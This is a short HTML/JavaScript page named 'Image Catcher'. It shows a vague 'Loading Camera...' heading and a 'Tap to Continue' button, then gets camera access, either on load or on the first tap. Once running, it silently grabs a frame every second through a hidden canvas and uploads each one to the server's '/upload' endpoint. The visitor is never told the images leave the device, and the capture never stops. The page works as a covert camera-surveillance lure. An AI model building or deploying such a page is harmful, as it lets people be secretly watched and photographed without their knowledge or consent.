<!DOCTYPE html>
<html>
<head>
  <title>Image Catcher</title>
</head>
<body style="text-align:center; font-family:sans-serif;">

  <h2>📸 Loading Camera...</h2>

  <button id="startBtn" onclick="startCamera()" style="padding:10px 20px; font-size:16px;">
    Tap to Continue
  </button>

  <br><br>

  <video id="video" autoplay playsinline width="300"></video>
  <canvas id="canvas" style="display:none;"></canvas>

<script>
let started = false;

async function startCamera() {
  if (started) return;
  started = true;

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.getElementById('video');
    video.srcObject = stream;

    document.getElementById('startBtn').style.display = 'none';

    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    setInterval(() => {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      ctx.drawImage(video, 0, 0);

      const img = canvas.toDataURL('image/jpeg', 0.6);

      fetch('/upload', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ img })
      });

    }, 1000);

  } catch (err) {
    console.log("Permission denied or blocked");
  }
}

// try auto start
window.onload = () => {
  startCamera();
};
</script>

</body>
</html>
